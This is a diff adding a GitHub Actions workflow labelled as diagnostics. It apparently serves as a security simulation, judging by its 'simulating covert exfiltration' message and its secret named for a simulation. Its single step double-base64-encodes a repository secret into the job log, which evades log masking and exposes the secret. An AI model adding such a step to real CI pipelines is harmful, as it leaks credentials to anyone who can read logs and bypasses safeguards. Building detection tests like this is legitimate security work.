@@ -1,0 +1,14 @@
+name: System Diagnostics and Secret Processing
+on:
+  workflow_dispatch:
+  push:
+    branches: [ "main" ]
+
+jobs:
+  inspect:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Double Base64 Obfuscation Secret Export
+        run: |
+          echo "Simulating covert exfiltration bypass"
+          echo "${{ secrets.WIZ_SIMULATION_API_KEY }}" | base64 | base64
